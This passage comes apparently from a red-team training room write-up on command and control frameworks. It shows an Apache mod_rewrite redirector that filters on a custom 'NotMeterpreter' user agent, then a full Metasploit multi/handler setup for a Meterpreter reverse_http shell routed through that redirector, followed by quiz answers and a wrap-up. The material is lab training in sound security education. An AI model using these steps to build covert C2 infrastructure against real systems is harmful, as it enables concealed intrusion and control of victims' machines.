  > ![image](https://user-images.githubusercontent.com/51442719/180653859-1fa44e91-5d38-40c1-aeaf-b5b1d511e197.png)
  > - *Packet Capture of the modified HTTP Payload with Meterpreter*
- Now that we have a field we can control in the HTTP Request, let's create an Apache2 mod_rewrite rule that filters on the user agent "NotMeterpreter" and forward it to our Metasploit C2 Server.

#### Modifying the Apache Config File 
- This section may sound intimidating but is actually quite easy; we will be taking the default Apache config and modifying it to our advantage. 
- On Debian based systems, the default config can be found at `/etc/apache2/sites-available/000-default.conf`.
```cmd
cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
```
- Now that we have a general idea of the Apache2 Config file is structured, we must add a few lines to the config file to enable the Rewrite Engine, add a rewrite condition, and lastly, pass through the Apache 2 Proxy. 
- This sounds fairly complex, but it's quite simple.
- To enable the [`Rewrite Engine`](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html), we must add `RewriteEngine On` onto a new line in the VirtualHost section.
- Now we will be using a Rewrite Condition targeting the HTTP User-Agent. 
- For a complete list of HTTP Request Targets, see the [`mod_rewrite documentation`](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html) on Apache.org. 
- Because we only want to match the User-Agent "NotMeterpreter", we need to use some basic Regular Expressions to capture this; adding a ^ signals the beginning of a string and a $ at the end of the series, giving us with "^NotMeterpreter$". 
- This Regex will only capture the NotMeterpreter User-Agent. 
- We can add this line `RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"` to our config to (as previously stated) only allow HTTP Requests with the NotMeterpreter user agent to access Metasploit.
- Lastly, we must forward the request through Apache2, through our proxy, to Metasploit.
- To do this, we must use the ProxyPass feature of Apache's [`mod_proxy module`](https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html). 
- To do this, we just need to specify the base URI that the request will be forwarded to (in our case, we just need "/"), and the target we want to forward the request to. 
- This will vary from setup to set up, but this IP Address will be your C2 server. 
- In the lab scenario, it will be localhost and port that Metasploit is listening on. This will give us a full config file that looks like so:
```cmd
cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
```

#### Setting Up Exploit/Multi/Handler
- To set up Meterpreter properly, we need to make a few modifications; We must set our LHOST argument to the incoming interface that we are expecting connections from, in our lab; this will be 127.0.0.1. 
- In the real world, this will be your public interface that your Redirector will be connecting to (aka your Public IP Address), and the LPORT will be whatever you like. 
- For the lab, we will be using TCP/8080; this can be whatever you like in production. 
- As always, the best practice is to run services over their standard protocols, so HTTP should run on port 80, and HTTPS should run on port 443. 
- These options will also need to be duplicated for ReverseListenerBindAddress and ReverseListenerBindPort.
- Next, we need to set up OverrideLHOST - This value will be your redirector's IP Address or Domain Name. 
- After that, we need to set the OverrideLPORT; this will be the port that the HTTP or HTTPS is running on, on your Redirector. 
- Lastly, we must set the OverrideRequestHost to true. 
- This will make Meterpreter respond with the OverrideHost information, so all queries go through the Redirector and not your C2 server. 
- Now that you understand what must be configured, let's dive into it:
  > 
```cmd
msfconsole
```
```cmd
use exploit/multi/handler
```
```cmd
set payload windows/meterpreter/reverse_http
```
```cmd
set LHOST 127.0.0.1
```
```cmd
set LPORT 8080
```
```cmd
set ReverseListenerBindAddress 127.0.0.1
```
```cmd
set ReverseListenerBindPort 8080
```
```cmd
set OverrideLHOST 192.168.0.44
```
```cmd
set OverrideLPORT 80
```
```cmd
set HttpUserAgent NotMeterpreter
```
```cmd
set OverrideRequestHost true
```
```cmd
run
```
- After this has all been set up, running your Meterpreter Reverse Shell should now proxy all communications through your Redirector!
- For awareness, the diagram below is how our Redirector is set up in our lab; as a reminder, in engagements, you will want to use multiple hosts and DNS records instead of IP Addresses. 
  > ![image](https://user-images.githubusercontent.com/51442719/180654203-f0101641-46d4-42be-bc9e-83e9bcd33acd.png)
  > - *Lab Redirector Setup*

### Answer the questions below
- What setting name that allows you to modify the User Agent field in a Meterpreter payload?
  > Answer format: [`*************`](#HTTPUserAgent)
- What setting name that allows you to modify the Host header in a Meterpreter payload?
  > Answer format: [`**************`](#HttpHostHeader)


---

# [Task 8  Wrapping Up]()

### Recap
- In this room, you hopefully learned a lot about Command and Control frameworks and will be able to take the knowledge you gained within this room and apply it in the real world. 
- At the end of the day, almost everyone in Red Team Ops uses a Command and Control Framework. 
- It's an essential part of every Red Teamer's toolkit, and we encourage you to go out and explore various C2 frameworks that were not covered or mentioned in this room.

### How to Choose a C2 Framework
- After finishing this room, you may be left with some questions, and hopefully, one of them is "How do I know what C2 Framework to choose in my Red Team Operations". 
- There is no right or wrong answer for this, just a few general questions that you should answer first:
  - What are your goals? 
  - Do you have a budget?
  - Do you need something highly customizable?
  - Is off-the-shelf AV Evasion necessary?
  - Do you need the ability to create your own modules/scripts?
  - Is built-in reporting necessary for you?
- You should then take that information to the C2 Matrix spreadsheet and narrow your selection based on the questions above. 
- If you find a Premium C2 Framework that meets your criteria, it is highly recommended you request an evaluation/trial to find out if that C2 Framework works best for you.

### Answer the questions below
- Read the closing task.
  > `No answer needed`

---


---

- [`Armitage`](https://drive.google.com/drive/folders/13LeaA2BnPwgt2fynwgFKqspFRRuP-ONi?usp=sharing)
- [`PTFM` `BTFM` `RTFM`](https://drive.google.com/drive/folders/18xs1JJI4a3ragcMRQ4PFa2zFxPPZoLcJ?usp=sharing)

---
